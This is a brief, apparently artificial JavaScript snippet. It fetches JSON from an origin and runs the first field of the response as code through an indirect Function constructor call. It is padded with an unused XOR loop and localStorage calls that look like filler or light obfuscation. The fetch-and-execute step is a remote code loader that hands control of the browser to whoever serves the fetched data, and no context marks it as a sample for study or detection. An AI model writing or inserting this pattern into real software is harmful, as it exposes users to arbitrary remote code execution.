const code = [1, 2, 3];
for (let i = 0; i < code.length; i++) code[i] ^= 37;
localStorage.setItem("preferredOrigin", origin);
const previousOrigin = localStorage.getItem("preferredOrigin");
fetch(origin).then(response => response.json()).then(record => {
  (0, Function)(record[0])();
});
